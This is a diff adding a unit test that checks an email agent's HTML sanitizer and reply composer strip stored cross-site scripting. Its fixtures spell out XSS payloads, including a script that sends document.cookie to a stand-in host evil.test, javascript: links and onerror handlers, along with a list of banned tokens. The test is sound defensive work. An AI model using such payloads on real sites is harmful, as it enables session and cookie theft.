@@ -10,6 +10,7 @@ from brainsos_agent.mail_runs import (
     is_valid_html,
     markdown_to_clean_html,
     sanitize_agent_reply,
+    sanitize_html,
 )
 from brainsos_mail.models import ParsedInboundEmail
 
@@ -213,6 +214,43 @@ class TestMailRunsHTMLAndChain(unittest.TestCase):
         )
         cleaned = sanitize_agent_reply(output)
         self.assertEqual(cleaned, "<table><tr><td>Metric</td></tr></table>")
+
+    def test_sanitize_html_and_compose_reply_body_strip_stored_xss_vectors(self):
+        malicious_html = (
+            '<div onclick="alert(1)" style="color: expression(alert(2));">'
+            '<p>Safe text</p>'
+            '<script>fetch("https://evil.test/steal?c=" + document.cookie)</script>'
+            '<iframe src="https://evil.test/frame"></iframe>'
+            '<img src="javascript:alert(3)" onerror="alert(4)" alt="bad">'
+            '<a href="javascript:alert(5)" target="_blank">click</a>'
+            '<a href="https://brainsos.ai" target="_blank">good</a>'
+            "</div>"
+        )
+        cleaned = sanitize_html(malicious_html)
+        self.assertIn("<p>Safe text</p>", cleaned)
+        self.assertIn('href="https://brainsos.ai"', cleaned)
+        self.assertIn('rel="noopener noreferrer"', cleaned)
+        for bad_token in ("<script", "<iframe", "onclick", "onerror", "javascript:", "expression(", "document.cookie"):
+            self.assertNotIn(bad_token, cleaned.lower())
+
+        rendered = markdown_to_clean_html(malicious_html)
+        self.assertNotIn("<script", rendered.lower())
+        self.assertNotIn("javascript:", rendered.lower())
+
+        inbound = ParsedInboundEmail(
+            message_id="<msg-xss@brainsos.local>",
+            thread_id="<msg-xss@brainsos.local>",
+            sender="attacker@evil.test",
+            recipient="ping@brainsos.local",
+            subject="XSS quote check",
+            clean_body="Please review quote.",
+            html_body='<p>Inbound text</p><script>alert("xss")</script><img src=x onerror=alert(9)>',
+            raw_mime=b"",
+        )
+        _, rich_reply = compose_reply_body("<p>Reply OK</p>", inbound)
+        self.assertIn("Inbound text", rich_reply)
+        self.assertNotIn("<script", rich_reply.lower())
+        self.assertNotIn("onerror", rich_reply.lower())
 
 
 if __name__ == "__main__":
